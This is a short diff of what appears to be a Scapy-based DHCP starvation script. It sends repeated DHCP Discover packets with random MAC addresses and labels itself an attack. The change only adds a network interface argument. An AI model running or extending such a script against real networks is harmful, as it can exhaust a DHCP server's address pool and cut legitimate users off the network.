@@ -23,7 +23,7 @@ def send_dhcp_discover():
         BOOTP(chaddr=[mac2str(mac)], xid=random.randint(0, 0xFFFFFFFF)) /
         DHCP(options=[("message-type", "discover"), "end"])
     )
-    sendp(dhcp_discover, verbose=0)
+    sendp(dhcp_discover, verbose=0, iface="Ethernet")
 
 def main():
     """Main function to send multiple DHCP Discover packets."""
@@ -36,4 +36,5 @@ def main():
         print("Attack stopped.")
 
 if __name__ == "__main__":
+
     main()
